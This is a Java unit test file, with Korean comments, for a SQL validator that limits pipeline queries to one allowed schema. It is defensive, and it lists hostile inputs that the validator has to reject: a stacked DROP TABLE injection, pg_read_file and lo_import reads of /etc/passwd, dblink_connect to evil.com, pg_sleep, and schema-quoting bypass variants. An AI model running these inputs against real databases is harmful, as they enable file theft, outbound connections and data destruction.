package com.smartfirehub.pipeline.service.validator;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.smartfirehub.pipeline.exception.UnsafeSqlException;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class SqlValidatorTest {

  private final SqlValidator validator = new SqlValidator();

  // --- 허용되는 구문 ---

  @Test
  void allows_simple_select_on_data_schema() {
    assertThatCode(() -> validator.validate("SELECT * FROM data.t")).doesNotThrowAnyException();
  }

  @Test
  void allows_select_with_where_order() {
    assertThatCode(() -> validator.validate("SELECT a, b FROM data.t WHERE c > 1 ORDER BY a"))
        .doesNotThrowAnyException();
  }

  @Test
  void allows_insert_select_within_data_schema() {
    assertThatCode(() -> validator.validate("INSERT INTO data.t (a, b) SELECT a, b FROM data.s"))
        .doesNotThrowAnyException();
  }

  @Test
  void allows_update_on_data_schema() {
    assertThatCode(() -> validator.validate("UPDATE data.t SET a = 1 WHERE id = 2"))
        .doesNotThrowAnyException();
  }

  @Test
  void allows_delete_on_data_schema() {
    assertThatCode(() -> validator.validate("DELETE FROM data.t WHERE id = 2"))
        .doesNotThrowAnyException();
  }

  @Test
  void allows_cte_referencing_only_data_schema() {
    assertThatCode(
            () ->
                validator.validate(
                    "WITH cte AS (SELECT id, x FROM data.s) "
                        + "SELECT t.id, cte.x FROM data.t JOIN cte USING (id)"))
        .doesNotThrowAnyException();
  }

  @Test
  void allows_trailing_semicolon() {
    assertThatCode(() -> validator.validate("SELECT * FROM data.t;")).doesNotThrowAnyException();
  }

  // --- 거부되는 구문 ---

  @Test
  void rejects_multiple_statements() {
    assertThatThrownBy(() -> validator.validate("SELECT 1; SELECT 2"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("멀티 스테이트먼트");
  }

  @Test
  void rejects_statement_appended_after_select() {
    assertThatThrownBy(() -> validator.validate("SELECT * FROM data.t; DROP TABLE data.t"))
        .isInstanceOf(UnsafeSqlException.class);
  }

  @Test
  void rejects_public_schema_reference() {
    assertThatThrownBy(() -> validator.validate("SELECT * FROM public.\"user\""))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("data");
  }

  @Test
  void rejects_information_schema_reference() {
    assertThatThrownBy(() -> validator.validate("SELECT * FROM information_schema.tables"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("data");
  }

  @Test
  void rejects_unqualified_table_reference() {
    assertThatThrownBy(() -> validator.validate("SELECT * FROM t"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("스키마");
  }

  @Test
  void rejects_cte_with_public_reference_inside() {
    assertThatThrownBy(
            () ->
                validator.validate("WITH cte AS (SELECT * FROM public.\"user\") SELECT * FROM cte"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("data");
  }

  @Test
  void rejects_drop_statement() {
    assertThatThrownBy(() -> validator.validate("DROP TABLE data.t"))
        .isInstanceOf(UnsafeSqlException.class);
  }

  @Test
  void rejects_truncate_statement() {
    assertThatThrownBy(() -> validator.validate("TRUNCATE data.t"))
        .isInstanceOf(UnsafeSqlException.class);
  }

  @Test
  void rejects_do_block() {
    assertThatThrownBy(() -> validator.validate("DO $$ BEGIN END $$"))
        .isInstanceOf(UnsafeSqlException.class);
  }

  @Test
  void rejects_pg_read_file_in_select() {
    assertThatThrownBy(() -> validator.validate("SELECT pg_read_file('/etc/passwd')"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("pg_read_file");
  }

  @Test
  void rejects_dblink_in_select() {
    assertThatThrownBy(() -> validator.validate("SELECT dblink_connect('host=evil.com dbname=x')"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("dblink_connect");
  }

  @Test
  void rejects_lo_import_in_select() {
    assertThatThrownBy(() -> validator.validate("SELECT lo_import('/etc/passwd')"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("lo_import");
  }

  @Test
  void rejects_garbage_input() {
    assertThatThrownBy(() -> validator.validate("not a sql"))
        .isInstanceOf(UnsafeSqlException.class);
  }

  @Test
  void rejects_null() {
    assertThatThrownBy(() -> validator.validate(null))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("비어");
  }

  @Test
  void rejects_blank() {
    assertThatThrownBy(() -> validator.validate("   "))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("비어");
  }

  // --- Task 1: 파라미터화(allowedSchema / allowUnqualifiedTables) 검증 ---

  /**
   * (1) 다른 스키마 참조는 표기 변형(따옴표, 점 주변 공백)과 무관하게 거부되어야 한다.
   *
   * <p>문자열 대조({@code contains("PUBLIC.")})는 이런 변형에 뚫리지만, AST 기반 검증기는 스키마 이름을 정규화해 비교하므로 뚫리지 않아야 한다.
   */
  @Test
  void rejects_other_schema_reference_regardless_of_quoting_variant() {
    // "허용되지 않는 스키마"로 좁혀 단언한다 — "data" 만 검사하면 미한정 거부 메시지("...data.user 형식으로...")에도
    // 매치되어, 파서가 이 표기를 미한정으로 오분류해도(=검증 우회) 테스트가 초록으로 남는 결함이 있었다.
    assertThatThrownBy(() -> validator.validate("SELECT * FROM \"public\".\"user\""))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("허용되지 않는 스키마");
    assertThatThrownBy(() -> validator.validate("SELECT * FROM public . \"user\""))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("허용되지 않는 스키마");
  }

  /**
   * (1-b) 위 거부가 permissive 모드({@code allowUnqualifiedTables=true})에서도 유지되는지 고정한다.
   *
   * <p>Task 3/4 가 배선할 모드가 바로 이 모드이며, 여기서 표기 변형이 오분류되면 "다른 에러"가 아니라 **통과**(=검증 우회)가 된다. 아래 다섯 형태는
   * PostgreSQL 이 동등하게 해석하는 {@code public."user"} 변형이다.
   */
  @ParameterizedTest
  @ValueSource(
      strings = {
        "SELECT * FROM \"public\".\"user\"",
        "SELECT * FROM public . \"user\"",
        "SELECT * FROM \"public\" . \"user\"",
        "SELECT * FROM PUBLIC.\"user\"",
        "SELECT * FROM smartfirehub.public.\"user\""
      })
  void rejects_other_schema_reference_variants_in_permissive_mode(String sql) {
    SqlValidator permissive = new SqlValidator("data", true);
    assertThatThrownBy(() -> permissive.validate(sql))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("허용되지 않는 스키마");
  }

  /** (1-c) {@code allowedSchema} 가 실제로 쓰인다 — "data" 하드코딩이 남아 있으면 이 케이스가 거꾸로 통과/거부된다. */
  @Test
  void allowed_schema_is_actually_parameterized() {
    SqlValidator analytics = new SqlValidator("analytics", false);
    assertThatCode(() -> analytics.validate("SELECT * FROM analytics.t")).doesNotThrowAnyException();
    assertThatThrownBy(() -> analytics.validate("SELECT * FROM data.t"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("허용되지 않는 스키마");
  }

  /** (2) set_config / current_setting 호출은 BLOCKED_FUNCTIONS 에 의해 거부된다. */
  @Test
  void rejects_set_config_and_current_setting_calls() {
    assertThatThrownBy(() -> validator.validate("SELECT set_config('search_path', 'public', false)"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("set_config");
    assertThatThrownBy(() -> validator.validate("SELECT current_setting('search_path')"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("current_setting");
  }

  /**
   * (2-b) {@code pg_sleep} 호출은 BLOCKED_FUNCTIONS 에 의해 거부된다(#385 Task 5, R5).
   *
   * <p>{@code statement_timeout} 이 쿼리 지속 시간은 묶어도 {@code pg_sleep} 이 점유하는 커넥션 자체는 막지 못하므로
   * 애플리케이션 레이어에서 조기 차단한다. 공유 deny-list 라 파이프라인 경로(무인자 생성자)에도 함께 적용됨을 이 테스트로 고정한다.
   */
  @Test
  void rejects_pg_sleep_call() {
    assertThatThrownBy(() -> validator.validate("SELECT pg_sleep(5)"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("pg_sleep");
  }

  /** (3) 롤 변경문(SET ROLE / RESET ROLE)은 SELECT/INSERT/UPDATE/DELETE 가 아니므로 문 타입 검사에서 거부된다. */
  @Test
  void rejects_role_change_statements() {
    assertThatThrownBy(() -> validator.validate("SET ROLE app_tenant"))
        .isInstanceOf(UnsafeSqlException.class);
    assertThatThrownBy(() -> validator.validate("RESET ROLE"))
        .isInstanceOf(UnsafeSqlException.class);
  }

  /**
   * (4) {@code allowUnqualifiedTables} 정책에 따라 스키마 없는 테이블 참조 허용 여부가 갈린다.
   *
   * <p>기본 생성자(무인자)는 기존 동작({@code allowUnqualifiedTables=false})을 그대로 유지해야 파이프라인 경로가 무변경이다.
   */
  @Test
  void unqualified_table_reference_policy_is_configurable() {
    SqlValidator permissive = new SqlValidator("data", true);
    assertThatCode(() -> permissive.validate("SELECT * FROM t")).doesNotThrowAnyException();

    SqlValidator strict = new SqlValidator("data", false);
    assertThatThrownBy(() -> strict.validate("SELECT * FROM t"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("스키마");

    // 기본(무인자) 생성자는 기존 동작(미한정 거부)을 그대로 유지한다.
    assertThatThrownBy(() -> validator.validate("SELECT * FROM t"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("스키마");
  }

  /**
   * (5) permissive 모드에서도 미한정 {@code pg_} 접두어 이름은 거부된다.
   *
   * <p>{@code pg_catalog}는 {@code search_path} 설정과 무관하게 항상 암묵 검색되므로, 미한정 허용만으로는 카탈로그
   * 열람(예: {@code pg_tables}로 다른 스키마 테이블 이름 나열, {@code pg_roles}로 롤 목록 나열)을 막지 못한다(#385
   * Task 3 실측). 정상적인 미한정 사용자 테이블 이름은 계속 통과해야 한다(역방향 단언).
   */
  @Test
  void rejects_unqualified_pg_prefixed_name_even_in_permissive_mode() {
    SqlValidator permissive = new SqlValidator("data", true);

    assertThatThrownBy(() -> permissive.validate("SELECT * FROM pg_tables"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("pg_catalog");
    assertThatThrownBy(() -> permissive.validate("SELECT * FROM pg_roles"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("pg_catalog");

    // 역방향: 정상 미한정 사용자 테이블은 여전히 통과한다.
    assertThatCode(() -> permissive.validate("SELECT * FROM customers")).doesNotThrowAnyException();
  }

  // --- unqualifiedTableNames — PG 식별자 폴딩 규칙 (#385 Task 4 리뷰 지적) ---

  /** 따옴표 없는 이름은 소문자로 접힌다 — PG 파서가 따옴표 없는 식별자를 항상 소문자로 접기 때문. */
  @Test
  void unqualifiedTableNames_unquotedName_isLowercased() {
    SqlValidator permissive = new SqlValidator("data", true);

    assertThat(permissive.unqualifiedTableNames("SELECT * FROM Customers"))
        .containsExactly("customers");
  }

  /**
   * 따옴표로 감싼 혼합 대소문자 이름은 원문 그대로 보존된다 — 무조건 소문자화하면 {@code pg_class.relname}과 바이트 단위로
   * 어긋나 호출부의 카탈로그 대조가 실패한다(리뷰 지적: {@code "MyTable"}은 소문자화하면 다른 이름이 된다).
   */
  @Test
  void unqualifiedTableNames_quotedMixedCaseName_preservesCase() {
    SqlValidator permissive = new SqlValidator("data", true);

    assertThat(permissive.unqualifiedTableNames("SELECT * FROM \"MyTable\""))
        .containsExactly("MyTable");
  }

  /** 스키마 한정 이름은 결과에서 제외된다 — 이 메서드는 미한정 이름만 돌려준다. */
  @Test
  void unqualifiedTableNames_qualifiedName_excluded() {
    SqlValidator permissive = new SqlValidator("data", true);

    assertThat(permissive.unqualifiedTableNames("SELECT * FROM data.t, u")).containsExactly("u");
  }
}
